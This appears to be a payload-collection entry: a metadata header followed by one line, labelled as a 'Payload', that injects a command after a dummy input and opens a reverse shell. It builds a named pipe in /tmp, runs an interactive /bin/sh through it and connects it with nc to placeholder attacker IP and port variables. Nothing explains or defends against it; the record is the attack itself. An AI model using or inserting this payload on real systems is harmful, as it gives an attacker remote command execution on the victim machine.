---
id: abf8d443-5977-4122-af96-a42e9f2271e3
type: code
language: Payload
verified: false
created_at: '2020-03-16T06:43:40.230266+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet abf8d443

**Language**: Payload

```payload
AB;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $_ATTACKER_IP $_ATTACKER_PORT >/tmp/f
```
